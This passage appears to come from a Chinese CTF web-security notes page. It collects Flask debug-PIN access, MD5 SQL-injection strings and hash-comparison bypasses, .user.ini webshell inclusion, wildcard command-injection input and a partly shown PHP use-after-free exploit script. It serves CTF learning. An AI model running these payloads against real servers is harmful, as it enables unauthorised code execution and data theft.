class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"><span class="built_in">print</span>(rv)</span><br><span class="line"></span><br><span class="line"><span class="comment">#输出: 961-361-247</span></span><br></pre></td></tr></table></figure><p>在报错页面输入pin之后,成功进入python的交互页面</p><p><img src="/images/ctfweb-others/image-20221024164345369.png" alt="image-20221024164345369"></p><h1 id="关于md5"><a href="#关于md5" class="headerlink" title="关于md5"></a>关于md5</h1><h2 id="md5-sql注入"><a href="#md5-sql注入" class="headerlink" title="md5_sql注入"></a>md5_sql注入</h2><p>假设服务器的查询语句为: 其中<code>$pass</code>是用户输入的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from &#x27;admin&#x27; where password=md5($pass,true)</span><br></pre></td></tr></table></figure><p>此时如果要注入,可以传:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ffifdyop</span><br><span class="line">129581926211651571912466741651878684928</span><br></pre></td></tr></table></figure><p>这两者在生成二进制的<code>md5</code>后可以包含<code>...&#39; or .. </code>这样的<strong>万能密码</strong>,能够达到注入目的</p><p>常常能遇到需要绕过<code>md5</code>比较的情况</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if($a != $b &amp;&amp; md5($a) == md5($b))</span><br></pre></td></tr></table></figure><h2 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过:"></a>数组绕过:</h2><p><strong>php中数组经过md5计算的值为<code>NULL</code></strong></p><p>所以传参可以这样传:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a[]=1&amp;b[]=2</span><br></pre></td></tr></table></figure><h2 id="0e绕过md5"><a href="#0e绕过md5" class="headerlink" title="0e绕过md5"></a>0e绕过md5</h2><p>另外一种方法: </p><p><code>0e</code>开头的字符串在参与比较时,<strong>会被当做科学计数法</strong>,结果转换为0,因此,下面两个数的比较:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0e830400451993494058024219903391 == 0e462097431906509019562988736854</span><br><span class="line">会被视为:</span><br><span class="line">0==0 从而返回True</span><br></pre></td></tr></table></figure><p>那么这种方法也可以用来绕过<code>md5</code>值的比较:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5(&#x27;QNKCDZO&#x27;) == md5(240610708) 这两者计算md5的结果都是0e开头的,所以这里会判定为True</span><br></pre></td></tr></table></figure><p><code>md5</code>计算后以<code>0e</code>开头的值还包括:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">240610708</span><br><span class="line">byGcY</span><br><span class="line">sonZ7y</span><br><span class="line">aabg7XSs</span><br><span class="line">aabC9RqS</span><br><span class="line">s878926199a</span><br><span class="line">s155964671a</span><br><span class="line">s214587387a</span><br><span class="line">s1091221200a</span><br></pre></td></tr></table></figure><br><h2 id="a-x3D-x3D-md5-a"><a href="#a-x3D-x3D-md5-a" class="headerlink" title="a&#x3D;&#x3D;md5(a)"></a>a&#x3D;&#x3D;md5(a)</h2><p>这里还需要利用上面,<code>0e</code>开头的字符串在参与比较时,<strong>会被当做科学计数法</strong>,结果转换为0的性质</p><p>符合这个条件的a必须以<code>0e</code>开头, <code>md5(a)</code>也必须以<code>0e</code>开头,且两者除了<code>0e</code>之外必须全为数字</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">符合条件的:0e215962017</span><br></pre></td></tr></table></figure><h2 id="绕过md5强比较"><a href="#绕过md5强比较" class="headerlink" title="绕过md5强比较"></a>绕过md5强比较</h2><p>例如:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">    ...</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure><p>这里由于使用了<code>===</code>强相等, 所以之前使用的数组绕过,<code>0e</code>绕过等就无法使用了</p><p>这里利用md5碰撞工具<code>fastcoll</code>,产生两个md5值相同的2进制文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">E:\CTF工具合集\md5碰撞\fastcoll_v1.0.0.5.exe&gt;fastcoll_v1.0.0.5.exe -o a b</span><br><span class="line">MD5 collision generator v1.5</span><br><span class="line">by Marc Stevens (http://www.win.tue.nl/hashclash/)</span><br><span class="line"></span><br><span class="line">Using output filenames: &#x27;a&#x27; and &#x27;b&#x27;</span><br><span class="line">Using initial value: 0123456789abcdeffedcba9876543210</span><br><span class="line"></span><br><span class="line">Generating first block: .</span><br><span class="line">Generating second block: S11.</span><br><span class="line">Running time: 0.153 s</span><br></pre></td></tr></table></figure><img src="/images/ctfweb-others/image-20221020163346764.png" alt="image-20221020163346764" style="zoom:67%;" /><p>在<code>burpsuite</code>的<code>repeater</code>中右键:<code>paste from file</code>,加载文件后选中右键-<code>send to decoder</code>(注意,直接复制到<code>decoder</code>中的话不是对二进制进行编码,结果会不一样), 然后进行URL编码:</p><img src="/images/ctfweb-others/image-20221020163559394.png" alt="image-20221020163559394" style="zoom:67%;" /><p>将编码后的内容分别复制给a和b</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=%bb%7f%6f%64%bd%90%86%6e%65%5f%4c%12%3f%9d%40%a1%7f%4b%bd%6c%ab%af%84%33%fe%a1%7b%6d%0b%b0%18%cc%c2%19%c7%c2%7a%cc%19%84%c7%23%ca%23%e7%4d%3b%ae%d9%bc%77%f6%ed%5d%95%33%3f%e7%65%4d%80%88%93%33%f4%86%47%25%f6%03%75%1e%54%d4%ee%30%66%55%ca%49%d5%94%f0%4e%32%5c%15%3b%76%49%c0%5b%4f%90%2b%c1%65%90%b1%ee%06%25%73%7f%57%97%6b%71%b3%0b%df%fe%1b%9f%d8%ba%e6%33%1d%6c%e2%42%23%ce%5f%ea%a5%e3&amp;b=%bb%7f%6f%64%bd%90%86%6e%65%5f%4c%12%3f%9d%40%a1%7f%4b%bd%ec%ab%af%84%33%fe%a1%7b%6d%0b%b0%18%cc%c2%19%c7%c2%7a%cc%19%84%c7%23%ca%23%e7%cd%3b%ae%d9%bc%77%f6%ed%5d%95%33%3f%e7%65%cd%80%88%93%33%f4%86%47%25%f6%03%75%1e%54%d4%ee%30%66%55%ca%49%d5%94%f0%ce%32%5c%15%3b%76%49%c0%5b%4f%90%2b%c1%65%90%b1%ee%06%25%73%7f%57%97%6b%71%b3%8b%de%fe%1b%9f%d8%ba%e6%33%1d%6c%e2%42%23%4e%5f%ea%a5%e3</span><br></pre></td></tr></table></figure><p>运行一下,响应包中没有<code>forbid ~</code>, 说明成功绕过了<code>md5</code>强比较</p><img src="/images/ctfweb-others/image-20221020163652761.png" alt="image-20221020163652761" style="zoom:80%;" /><p>这里直接备用几个能直接绕过md5强比较的值(URL编码后的):</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">%bb%7f%6f%64%bd%90%86%6e%65%5f%4c%12%3f%9d%40%a1%7f%4b%bd%6c%ab%af%84%33%fe%a1%7b%6d%0b%b0%18%cc%c2%19%c7%c2%7a%cc%19%84%c7%23%ca%23%e7%4d%3b%ae%d9%bc%77%f6%ed%5d%95%33%3f%e7%65%4d%80%88%93%33%f4%86%47%25%f6%03%75%1e%54%d4%ee%30%66%55%ca%49%d5%94%f0%4e%32%5c%15%3b%76%49%c0%5b%4f%90%2b%c1%65%90%b1%ee%06%25%73%7f%57%97%6b%71%b3%0b%df%fe%1b%9f%d8%ba%e6%33%1d%6c%e2%42%23%ce%5f%ea%a5%e3</span><br><span class="line">%bb%7f%6f%64%bd%90%86%6e%65%5f%4c%12%3f%9d%40%a1%7f%4b%bd%ec%ab%af%84%33%fe%a1%7b%6d%0b%b0%18%cc%c2%19%c7%c2%7a%cc%19%84%c7%23%ca%23%e7%cd%3b%ae%d9%bc%77%f6%ed%5d%95%33%3f%e7%65%cd%80%88%93%33%f4%86%47%25%f6%03%75%1e%54%d4%ee%30%66%55%ca%49%d5%94%f0%ce%32%5c%15%3b%76%49%c0%5b%4f%90%2b%c1%65%90%b1%ee%06%25%73%7f%57%97%6b%71%b3%8b%de%fe%1b%9f%d8%ba%e6%33%1d%6c%e2%42%23%4e%5f%ea%a5%e3</span><br><span class="line">--------------------------------------------------------------------------------------------------------</span><br><span class="line">M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</span><br><span class="line">M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</span><br><span class="line">--------------------------------------------------------------------------------------------------------</span><br><span class="line">%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line">%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure><h1 id="user-ini自动包含"><a href="#user-ini自动包含" class="headerlink" title=".user.ini自动包含"></a>.user.ini自动包含</h1><p><a href="2e610037.html">[SUCTF 2019]CheckIn</a></p><p><code>.user.ini</code>实际上就是一个可以由用户自定义的<code>php.ini</code>配置文件，我们能够自定义的设置是模式为“<code>PHP_INI_PERDIR</code> 、 <code>PHP_INI_USER</code>”的设置。<br>它比<code>.htaccess</code>(分布式配置文件)用的更广，不管是<code>nginx/apache/IIS</code>，只要是以<code>fastcgi</code>(进程管理器)运行的php都可以用这个方法。</p><p>其中有两项可以为我们所用:</p><ul><li><p><code>auto_prepend_file</code>指定一个文件，自动<strong>包含在要执行的文件前</strong>，类似于在文件前调用了<code>require()</code>函数。</p></li><li><p><code>auto_append_file</code>类似，只是<strong>在文件后面包含</strong>。</p></li></ul><p><strong>例如如果同目录下有<code>.user.ini</code>,其内容为:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=&quot;1.jpg&quot;</span><br></pre></td></tr></table></figure><p><strong>那么在执行同目录下的<code>index.php</code>(或者其他php文件)时,就会先自动地对<code>1.jpg</code>进行包含</strong></p><p><strong>这种方法常常可以用来执行图片马等</strong></p><h1 id="exif-imagetype图片检测的绕过方法"><a href="#exif-imagetype图片检测的绕过方法" class="headerlink" title="exif_imagetype图片检测的绕过方法"></a>exif_imagetype图片检测的绕过方法</h1><p>在需要绕过的文件头部加上对应符合要求的文件头字段:</p><p><strong>exif_imagetype() 读取一个图像的第一个字节并检查其签名。判断一个图像的类型</strong></p><p>常见的文件类型的文件头:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">JPEG,JPG: JPGGraphic File</span><br><span class="line">GIF: GIF89A</span><br><span class="line">ZIP: Zip Compressed</span><br><span class="line">doc,xls,xlt,ppt,apr等: MS Compound Document v1 or Lotus Approach APRfil</span><br></pre></td></tr></table></figure><p>另外,也可以在一张真实图片后面加上一句话木马的内容来绕过,具体见: <a href="96b78edd.html">DVWA-文件上传-high</a></p><h1 id="gt-x2F-dev-x2F-null"><a href="#gt-x2F-dev-x2F-null" class="headerlink" title="_&gt;&#x2F;dev&#x2F;null"></a>_&gt;&#x2F;dev&#x2F;null</h1><img src="/images/ctfweb-others/image-20221017215513812.png" alt="image-20221017215513812" style="zoom:67%;" /><blockquote><p><code>c</code>的内容会作为系统命令被<code>system</code>语句执行</p><p>后面 <code>&gt;/dev/null 2&gt;&amp;1</code> 的含义是将前面的命令无效化</p><p>符号<code>&gt;</code>表示重定向<code> &gt;/dev/null</code>表示<strong>将前面命令的输出重定向到 一个空设备文件中，因此不输出任何信息到终端</strong></p><p><code>2&gt;&amp;1</code>的含义是将命令执行的错误信息重定向到空设备文件中</p></blockquote><p>因此这里需要把前面的命令和<code> &gt;/dev/null</code>截断,这里可以使用分号</p><h1 id="模糊执行bin目录下的命令"><a href="#模糊执行bin目录下的命令" class="headerlink" title="模糊执行bin目录下的命令"></a>模糊执行<code>bin</code>目录下的命令</h1><p>假设有<code>system($c);</code>在过滤得比较过分的情况下,可以这样给c传参:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=/???/????64%20????.???</span><br><span class="line">翻译过来就是c=/bin/base64 flag.php</span><br><span class="line">也就是把flag.php的内容base64编码后输出</span><br></pre></td></tr></table></figure><h1 id="或许可以用来扫描根目录-CTFshow-web72"><a href="#或许可以用来扫描根目录-CTFshow-web72" class="headerlink" title="或许可以用来扫描根目录(CTFshow_web72)"></a>或许可以用来扫描根目录(CTFshow_web72)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="meta">?&gt;</span> <span class="comment">//这里闭合前面的php标签</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)</span><br><span class="line">&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>创建类<code>new DirectoryIterator</code>下的一个对象,外部调用<code>DirectoryIterator</code>时，传入一个目录路径字符串，实例化<code>DirectoryIterator</code>类</p><p><code>glob://</code>查找匹配的文件路径模式, 那么glob:&#x2F;&#x2F;<strong>&#x2F;</strong>*  作用就是查找根目录下的所有文件，查找到的是它们的路径</p><p>传给外层的<code>new DirectoryIterator</code>后，就可以对这些路径进行扫描</p><p>接着使用<code>foreach</code>循环输出所有<code>__toString</code>将类对象转化为字符串形式输出</p><p>用于读取<code>flag.php</code>的<code>uaf</code>脚本, 将此脚本进行url编码后,作为值传给POST中的参数以执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ctfshow</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$backtrace</span>; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">            <span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;<span class="title function_ invoke__">getTrace</span>();</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$backtrace</span> = <span class="title function_ invoke__">debug_backtrace</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$v</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; </span><br><span class="line"></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span 